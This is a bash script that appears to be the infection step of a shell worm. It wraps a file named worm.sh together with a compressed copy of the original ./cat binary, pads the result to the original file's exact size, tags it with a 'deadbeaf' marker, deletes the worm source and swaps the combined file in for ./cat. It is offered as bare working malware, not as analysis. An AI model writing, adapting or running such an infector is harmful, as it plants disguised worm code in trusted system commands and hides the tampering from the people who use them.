#!/bin/bash

cat_size=$(ls -l ./cat | awk '{print $5}')
#echo $cat_size

cat ./worm.sh > shall
chmod 755 ./shall
mv ./cat ./cat_tmp
tar -zcvm ./cat_tmp >> ./shall

shall_size=$(ls -l ./shall | awk '{print $5}')
size=$(($cat_size-$shall_size-8))
#echo $size
truncate --size=+${size} ./shall

echo -e 'deadbeaf\c' >> ./shall

rm ./cat_tmp
rm ./worm.sh
mv ./shall ./cat
